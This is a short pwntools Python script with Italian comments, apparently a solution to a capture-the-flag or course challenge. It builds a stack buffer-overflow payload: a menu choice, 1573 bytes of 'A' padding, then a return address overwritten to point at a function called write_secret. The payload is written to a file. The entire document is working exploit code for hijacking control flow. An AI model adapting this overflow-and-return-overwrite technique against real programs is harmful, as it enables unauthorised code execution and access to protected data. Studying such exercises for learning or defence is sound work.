from pwn import *
context.arch='amd64'
context.os='linux'

#per trovare l'indirizzo
#pwndbg> print write_secret
#$1 = {void (void)} 0x555555555229 <write_secret>

ret_addr = 0x555555555229
addr = p64(ret_addr, endian ='little')

nop = asm('nop', arch="amd64")

payload = b"2\n" + b"A"*1022

payload += b"A" * 551 + addr

with open("./payload_challenge_extra1", "wb") as f: 
	f.write(payload)
